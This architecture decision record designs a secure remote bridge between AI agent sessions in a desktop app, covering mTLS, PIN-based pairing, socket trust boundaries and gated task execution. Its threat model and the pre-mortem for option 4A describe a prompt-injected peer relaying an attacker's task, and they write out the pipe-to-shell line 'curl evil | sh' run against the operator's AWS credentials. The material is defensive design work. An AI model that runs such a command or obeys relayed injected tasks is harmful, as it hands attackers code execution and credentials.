# ADR 0002 — Claude-to-Claude Remote Bridge Architecture

- **Status:** Proposed (awaits operator answers to CANNOT-ANSWER items §Q)
- **Date:** 2026-07-15
- **Author:** software-architect
- **Supersedes:** none · **Superseded by:** none
- **Optimizing ONLY for:** resilience · SECURITY (paramount) · operability · 100x headroom. Cost/effort/complexity are NOT constraints.

> **Grounding (verified against repo, 2026-07-15):**
> - Commands registered in `src-tauri/src/lib.rs:136` `generate_handler![...]`; state via `.manage(...)` at `lib.rs:132-135`.
> - `src-tauri/src/pty.rs:46` `pty_spawn(state, on_event: Channel, cwd, shell, cols, rows)`. PTY output uses a **bounded `sync_channel(256)` ≈2MB backpressure queue** (`pty.rs`, reader thread) — remote task streaming reuses this exact pattern.
> - `pty.rs` strips `CLAUDE*`/`AI_AGENT` env so spawned `claude` is a clean top-level session — the bridge must **preserve** this (do not re-leak env into remote-spawned shells).
> - `src-tauri/src/validate.rs`: `clean_arg`, `valid_branch`, `valid_git_url`, `valid_mutable_path`, `valid_name` — reuse for peer-name/path/url in bridge payloads.
> - `capabilities/default.json`: minimal allowlist (`core:default`, opener, dialog, updater, process). **No network permission today.**
> - `tauri.conf.json:21` CSP: `connect-src 'self' ipc: http://ipc.localhost` — **frontend never talks to the network directly**; all bridge traffic goes through Rust. CSP does NOT need loosening (this is a security win — keep it).
> - `Cargo.toml`: `reqwest` w/ `rustls-tls` (rustls already in tree), `tokio` features = `rt, rt-multi-thread, process, io-util, time, sync` — **`net` feature is MISSING and must be added** for a listener.
> - No network server exists in the app today — this is the first inbound socket. Threat surface is net-new.

---

## Threat Model (attack tree — the two crown-jewel surfaces)

**Asset:** full terminal execution on the receiving machine (RCE-by-design). **Adversary classes:** (A) network MITM on first pairing, (B) network attacker post-pairing, (C) a *paired-but-malicious* peer, (D) a *prompt-injected* honest peer relaying attacker instructions, (E) a co-resident local user/process spoofing "localhost".

```
GOAL: attacker causes arbitrary command execution on victim Muya host
├─ (A) MITM the first pairing → become the pinned identity
│   ├─ intercept TCP + present own cert        ── mitigated: PAKE (CPace) binds channel to PIN; cert SPKI confirmed via SAS
│   └─ downgrade / no-auth path                ── mitigated: remote listener REFUSES any non-mTLS, non-paired connection
├─ (B) post-pairing network attacker
│   ├─ replay / inject frames                  ── mitigated: TLS 1.3 AEAD channel; frames only inside mTLS
│   └─ connect w/o client cert                 ── mitigated: with_client_cert_verifier requires cert (tokio-rustls #83: enforce, fail-closed)
├─ (C) paired-but-malicious peer sends "rm -rf" / SSH exfil task
│   └─ ← PRIMARY RESIDUAL RISK ── mitigated by: per-request human approval (default) + per-peer capability scope + audit log + sandboxed exec context
├─ (D) prompt-injected honest peer relays attacker's task
│   └─ same mitigation as (C): the bridge treats EVERY inbound task as untrusted regardless of peer trust
└─ (E) local attacker spoofs "localhost" to skip auth
    ├─ bind remote listener to 0.0.0.0 by mistake   ── mitigated: SEPARATE sockets; local listener binds 127.0.0.1 ONLY, never 0.0.0.0
    ├─ another local uid connects to local socket    ── mitigated: local socket = unix-domain socket, 0600, in per-user dir; loopback TCP is NOT trusted as "local"
    └─ SO_PEERCRED spoof / PID reuse                  ── NOT relied upon (CVE-2025-14282 shows peercred bypassable + non-portable on macOS)
```

STRIDE highlights: **Spoofing** (E, A) is the sharpest edge and gets the whole refutation budget; **Elevation of Privilege** = (C)/(D) the RCE crux; **Repudiation** handled by append-only audit log (§4).

---

## Decision 1 — Transport + mTLS stack

**Context.** First inbound socket in the app. Need a listener + dialer, TLS 1.3 mutual auth, enforced only for non-localhost, no central CA (peers are personal machines).

**Options.**
| Opt | Approach | Pre-mortem verdict |
|---|---|---|
| 1A | **`tokio-rustls` (raw `TlsAcceptor`/`TlsConnector`) + hand-rolled length-prefixed framing** | Survives. rustls already in tree via reqwest; minimal surface; no HTTP semantics to abuse (no header smuggling, no HTTP/2 stream-reset DoS). |
| 1B | `axum`/`hyper` + rustls (HTTP/2 or WS) | "100x → HTTP/2 rapid-reset (CVE-2023-44487) DoS'd the box; and hyper's routing added a request-smuggling surface we didn't need for a 2-peer link." Rejected: HTTP machinery is attack surface we don't need. |
| 1C | QUIC (`quinn`) + rustls | Attractive for streams/NAT, but "1 yr later: quinn pulls a large new async/UDP stack, harder to reason about, and adds a datagram amplification surface." Deferred — revisit for §5 NAT traversal, not MVP. |

**Cert model:** each peer generates a **long-lived self-signed Ed25519 identity keypair on first run** (persisted in OS keychain / app data, 0600). No CA. Trust = **SPKI-hash pinning (TOFU)** established during pairing (§2). Renewal-safe: pin the SPKI, not the full cert ([OWASP pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning)).

**mTLS enforcement:** the **remote** listener uses `ServerConfig::builder().with_client_cert_verifier(pinned_peers_verifier)` — a custom verifier that accepts **only** SPKI hashes in the pinned-peer registry, fail-closed. Per tokio-rustls #83 the "no cert" case must be handled explicitly, so the verifier rejects absent/unknown certs at handshake. The **local** listener (§3) uses **no TLS at all** — different socket, different bind, never mixed.

**Decision:** **1A — `tokio-rustls` + length-prefixed framing, per-peer self-signed Ed25519 + SPKI-pin TOFU.**

**Consequences.** (+) smallest crypto attack surface, fail-closed mTLS, keys never leave keychain. (−) manual framing (mitigated §6). (−) `tokio` gains `net` feature; rustls becomes a direct dep. Door: **two-way** per-peer, **one-way** for the pinning format → version the registry schema.
**Confidence: High.** Evidence: [tokio-rustls repo](https://github.com/rustls/tokio-rustls), [#83 client-cert enforcement](https://github.com/rustls/tokio-rustls/issues/83), [rustls ConfigBuilder](https://docs.rs/rustls/latest/rustls/struct.ConfigBuilder.html).

---

## Decision 2 — First-pairing handshake (no central CA, PIN-based, MITM-resistant)

**Context.** Two peers must bootstrap mutual trust over an untrusted first hop using a short human-transferred secret (PIN). Must resist an active MITM on first contact.

**Options.**
| Opt | Approach | Pre-mortem verdict |
|---|---|---|
| 2A | **CPace (balanced PAKE) over the raw channel → derive session key → each side sends its identity cert → confirm both SPKI hashes via a 6-digit SAS derived from the PAKE transcript** | Survives. CPace is the CFRG-selected balanced PAKE; a MITM without the PIN cannot complete the exchange, and the SAS binds the pinned cert to the authenticated channel. |
| 2B | Pre-shared-secret + plain cert exchange (send certs, HMAC with PIN) | "MITM relayed both certs and the low-entropy PIN was brute-forced offline from the HMAC → attacker pinned itself." Rejected: PIN-as-HMAC-key leaks to offline dictionary attack; PAKE is exactly the fix. |
| 2C | SPAKE2 / SPAKE2+ | Works, but "kleptographic weakness vs CPace" and it *lost* the CFRG balanced-PAKE selection to CPace. Rejected in favor of the standardized winner. |

**Where PIN lives:** the **listening (invitee)** peer generates a one-time 8-digit PIN shown in its Remote-pairing UI; the **dialing** peer's operator types it. PIN is **single-use, 5-min TTL, 5-attempt lockout** (throttles online PAKE guessing — PAKE limits an attacker to *one online guess per run*). After success, the exchanged SPKI hashes are pinned persistently under a human-chosen peer name; the PIN is discarded. Pairing is **long-lived** (survives reconnects) until explicitly revoked.

**Decision:** **2A — CPace PAKE + SAS-confirmed SPKI pinning.** (This is a **one-way door** on the wire protocol — spend the budget here: version the PAKE message set from day one.)

**Consequences.** (+) active-MITM-resistant first contact with a short PIN; (+) offline-dictionary-proof. (−) need a vetted CPace impl (audit the crate; pin version; the DH group is a one-way choice). (−) SAS UX must force the human to compare/enter — a "just click OK" UX silently downgrades to TOFU.
**Confidence: High.** Evidence: [CFRG selected CPace for balanced PAKE](https://en.wikipedia.org/wiki/Password-authenticated_key_agreement), [RFC 9383 SPAKE2+ (context)](https://www.rfc-editor.org/info/rfc9383/), [SAS device pairing survey](https://arxiv.org/pdf/1709.02690).

---

## Decision 3 — Local-vs-remote trust boundary (security-critical seam)

**Context.** LOCAL (localhost) must be zero-friction (no PIN/crypto); REMOTE must be mTLS+paired. The danger: a remote or co-resident attacker impersonating "local" to skip auth.

**Options.**
| Opt | Approach | Pre-mortem verdict |
|---|---|---|
| 3A | Single TCP listener on `127.0.0.1`, treat any loopback connection as trusted-local | "A co-resident low-priv user connected to 127.0.0.1:port and got full RCE as my uid; and one refactor accidentally bound 0.0.0.0 → the whole internet was 'local'." Rejected. Loopback ≠ same-user. |
| 3B | Loopback TCP + `SO_PEERCRED` uid check | "macOS has no portable SO_PEERCRED for TCP; and CVE-2025-14282 shows peercred is spoofable via forwarding/PID-reuse." Rejected: non-portable + bypassable, per research. |
| 3C | **Two physically separate listeners: LOCAL = Unix-domain socket, mode 0600, in the per-user app-data dir (owner-only); REMOTE = TCP bound to a non-loopback iface, mTLS+paired only. No shared code path decides trust — the socket you arrived on IS the trust level.** | Survives. Filesystem perms (0600, owner dir) enforce same-user by the kernel; no uid guesswork; the two paths can never be confused because they're different sockets. |

**Decision:** **3C — separate sockets; trust is a property of *which listener accepted you*, never a runtime "is this localhost?" test.** Local = owner-only UDS. Remote = mTLS TCP. The word "localhost" never gates auth in code (kills the spoof class E entirely). REMOTE listener is **off by default**, opt-in per session, and **binds a specific interface, never `0.0.0.0`**, guarded by a startup assertion + test.

**Consequences.** (+) eliminates localhost-spoofing as a category (structural, not check-based); (+) OS enforces the local boundary. (−) two socket code paths to maintain; (−) Windows UDS perms differ — Windows local path needs a named-pipe with an explicit owner-only DACL (flag as platform work). Door: **two-way** (can add loopback-TCP later behind a peercred+token belt-and-suspenders, but not needed).
**Confidence: High.** Evidence: [MySQL SO_PEERCRED socket auth](https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/socket-pluggable-authentication.html), [CVE-2025-14282 peercred bypass](https://www.openwall.com/lists/oss-security/2025/12/16/2), [Nuxt IPC socket no-peercred bypass](https://dailycve.com/nuxt-dev-server-ipc-socket-permission-bypass-ghsa-5gvc-46gq-948j-dc-jun2026-458/).

---

## Decision 4 — Remote task EXECUTION model (the RCE crux)

**Context.** An inbound remote request causes terminal-capable execution. A paired-but-malicious (C) or prompt-injected (D) peer must not silently own the box. The bridge treats **every inbound task as untrusted regardless of peer trust level** — pairing authenticates *who*, not *what they may do*.

**Options (defense-in-depth, not either/or).**
| Opt | Approach | Pre-mortem verdict |
|---|---|---|
| 4A | Auto-run inbound tasks in the peer's Claude session | "A paired peer got prompt-injected; the attacker's task ran `curl evil | sh` with my AWS creds before I saw a thing." Rejected as a *default* — RCE-on-delivery. |
| 4B | Per-request human approval only | Good, but "approval fatigue → operator rubber-stamped; and a huge task streamed before I could read it." Necessary but insufficient alone. |
| 4C | **Layered: (1) per-request human approval by default [product-toggle §Q1] + (2) per-peer capability scope (allowlist of what this peer may request) + (3) sandboxed exec context (dedicated cwd/worktree, env stripped incl. CLAUDE*/secrets, resource caps) + (4) append-only audit log of every inbound request+decision+output-hash** | Survives. Overlapping controls bound blast radius even when one layer fails; matches MCP HITL + sandbox best practice. |

**Decision:** **4C — layered.** Secure **default = approve-each** with a human-readable diff of the exact command/task before execution (elicitation-style). Execution runs in a **constrained context**: a dedicated worktree/cwd, the existing `pty.rs` env-strip preserved and extended to drop secrets, no inheritance of the operator's live shell. `validate.rs` guards applied to any structured args. Every inbound request is written to an **append-only audit log** (request, peer, decision, timestamp, output hash) for non-repudiation. Per-peer **capability scope** (e.g. "read-only research" vs "may run shell") is pinned at pairing and enforced server-side.

**Consequences.** (+) no silent RCE even from a trusted-but-injected peer; (+) blast-radius isolation + auditability. (−) approve-each adds friction (that's the point; auto-run is opt-in per-peer per §Q1). (−) true OS sandbox (seatbelt/landlock) is follow-on hardening beyond the worktree isolation.
**Confidence: High** on the layering; **Medium** on default posture pending §Q1. Evidence: [MCP HITL / elicitation](https://modelcontextprotocol.io/specification/2025-06-18/server/tools), [OWASP MCP05 command injection](https://owasp.org/www-project-mcp-top-10/2025/MCP05-2025%E2%80%93Command-Injection&Execution), [Trail of Bits prompt-injection→RCE](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/).

---

## Decision 5 — Peer identity & addressing

**Context.** Name/discover/persist peers across reconnects without a directory server.

**Options.** 5A explicit `IP:port` + persistent pinned-cert registry · 5B mDNS auto-discovery on LAN · 5C hybrid (mDNS *hints* only, trust still = pinned registry).

**Pre-mortem.** 5B alone: "an mDNS spoofer on the café LAN advertised itself as my paired peer name → operator dialed the attacker." Rejected as a *trust* source. mDNS may **suggest** candidates but **identity is always the pinned SPKI**, never the name/IP.

**Decision:** **5C — persistent pinned-peer registry is the sole source of trust; mDNS is optional discovery convenience (LAN §Q3), verified against pins.** Registry: `peer_id` = SPKI hash, human label, last-known addr(s), capability scope, paired-at. Reconnect: dial known addr, **re-verify pinned SPKI** on every connect (address can change, identity cannot). Registry stored in app data, integrity-checked.

**Consequences.** (+) address-independent stable identity; (+) rebinding-attack-proof. (−) manual addr entry for WAN peers (until §Q3 decides NAT traversal). Door: **two-way** on discovery; **one-way** on registry schema (version it).
**Confidence: High.** Evidence: [OWASP SPKI pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning), [TOFU Android AOSP](https://source.android.com/docs/core/connect/wifi-tofu).

---

## Decision 6 — Message framing / protocol

**Context.** Request/response envelope over the mTLS channel; stream long task output back; hand payload to the remote Claude session.

**Options.** 6A length-prefixed JSON frames over the raw TLS byte stream · 6B gRPC/HTTP2 · 6C WebSocket-over-TLS.

**Pre-mortem.** 6B/6C drag in HTTP machinery already rejected in D1 (rapid-reset DoS, smuggling). 6A survives: length prefix lets the receiver **reject oversized/malformed frames before parse** (DoS guard) and read exactly one envelope deterministically.

**Decision:** **6A — length-prefixed (u32 BE, hard max e.g. 16 MB) JSON envelopes** over the tokio-rustls stream. Streaming: task output returns as a sequence of `chunk` frames terminated by an `end` frame — reusing `pty.rs`'s **bounded-queue backpressure** so a runaway remote job can't OOM either side. **Payload handoff to remote Claude:** a **broker queue** the remote `/remote-claude` skill polls (NOT a raw PTY write). Rationale: writing attacker bytes straight into a live PTY is itself an injection vector; the queue lets the approval/capability layer (§4) gate before anything reaches a shell.

**Envelope (versioned):**
```jsonc
{ "v":1, "type":"request|response|chunk|end|error|control",
  "id":"uuid", "peer":"<spki-hash>", "capability":"research|shell|file",
  "kind":"question|task|file", "payload":{...},
  "stream":true, "seq":0, "final":false }
```

**Consequences.** (+) minimal parser surface, early reject, backpressured streaming, no PTY-injection. (−) hand-rolled framing needs fuzzing (add cargo-fuzz target). Door: **one-way** on envelope `v` → versioned from frame 1.
**Confidence: High.** Evidence: [JSON streaming / length-prefix](https://en.wikipedia.org/wiki/JSON_streaming), [`pty.rs` bounded sync_channel(256) backpressure] (repo).

---

## Decision 7 — Seam/contract (Tauri commands + events) & build order

**New Tauri command surface** (Bounded Context: the bridge owns its own model; no internal schema shared with pty/agents — payloads cross via the versioned envelope only):

| Command | Purpose |
|---|---|
| `bridge_local_listen(enable)` | start/stop the owner-only **local** UDS listener |
| `bridge_remote_listen(enable, iface)` | start/stop **remote** mTLS TCP listener (off by default, never 0.0.0.0) |
| `bridge_pair_invite() -> {pin, expires_at}` | invitee: show PIN, arm CPace responder |
| `bridge_pair_connect(addr, pin, label)` | dialer: run CPace, confirm SAS, pin SPKI |
| `bridge_pair_confirm_sas(peer, sas_ok)` | human confirms the short auth string |
| `bridge_list_peers() / bridge_revoke_peer(peer)` | registry mgmt |
| `bridge_send(peer, kind, payload) -> req_id` | send request/task to a peer |
| `bridge_approve(req_id, decision, scope?)` | human approves/denies an **inbound** request |
| `bridge_set_capability(peer, scope)` | per-peer capability scope |

**Events (`emit`):** `bridge://pairing-request`, `bridge://sas-compare`, `bridge://inbound-request` (needs approval), `bridge://stream-chunk`, `bridge://stream-end`, `bridge://peer-status`, `bridge://error`. **Capability delta:** add a scoped `bridge:*` permission set in `capabilities/default.json`; **no CSP change** (frontend still ipc-only).

**Build order (phased, binary-ish acceptance):**
| Faz | Scope | Acceptance hint |
|---|---|---|
| **0 Prep** | add `tokio` `net`, direct rustls dep; scaffold `bridge.rs`, registry store, audit log; UI Remote/Local split shell (new `"chat"` view) | `cargo test` green; empty listeners bind/unbind; UI shows two clearly-separated options |
| **1 Local MVP** | owner-only UDS, envelope framing, broker queue, echo a request→response between two local Claude sessions; **approve-each** wired | two terminals on one host exchange a text request+reply; a 2nd local uid **cannot** connect (perm-denied) |
| **2 Remote mTLS + pairing** | Ed25519 identity, tokio-rustls mTLS, CPace pairing + SAS + SPKI pin, remote listener opt-in | two hosts pair with PIN; tampering the PIN or MITMing the handshake **fails closed**; unpaired/no-cert dial **rejected** |
| **3 Task handoff + files + streaming** | task kind, file/code payload, chunked streaming w/ backpressure, per-peer capability scope, sandboxed exec cwd, audit log complete | remote runs an approved shell task in an isolated worktree, streams output back; a denied/oversized/over-scope task is blocked + logged |

**Contract proof (Golden Rule §2):** before declaring "architecture ready," Faz 1 must demonstrate a **contract test**: a mock peer sends a canonical envelope over the UDS and the receiver emits `bridge://inbound-request` + a matching `response` frame — proving the seam holds end-to-end, not just on paper.

---

## Q — CANNOT-ANSWER (operator/product-intent only)

1. **Default execution posture:** approve-each (recommended secure default) vs allow per-peer auto-run opt-in? What is the max auto-run capability a peer may ever be granted?
2. **Transcript/audit retention:** how long are inbound request logs + task outputs kept, and may task payloads (which can contain secrets/code) be persisted at all, or memory-only?
3. **Network reach:** LAN-only, or may remote peers live on the **public internet** (drives §5 NAT traversal / whether to revive QUIC-1C, and firewall guidance)?
4. **Capability taxonomy:** what named scopes does the product want (e.g. `research` read-only vs `shell` full-exec vs `file`)? This shapes §4 enforcement.
5. **Multi-peer fan-out:** is `bridge_send` ever one-to-many (broadcast a task), or strictly 1:1? Affects blast-radius design.

---

## Handoff (builders)

- `@mcp-developer` / bridge builder: implement `bridge.rs` per D1/D3/D6; **fail-closed** mTLS verifier; separate UDS(local)/TCP(remote) sockets; add `tokio` `net`. Use `devops-expert` skill for any cert-storage/keychain packaging.
- `@inference-developer` / skill author: the `/remote-claude` skill **polls the broker queue** (D6), never reads a raw socket; renders inbound requests for human approval before handing to Claude.
- `@devops-developer`: notarization/keychain entitlement for identity keypair storage; ensure remote listener default-off ships that way.
- **One-way doors (spend budget):** D2 PAKE wire format, D6 envelope `v`, registry schema — all versioned from frame 1.
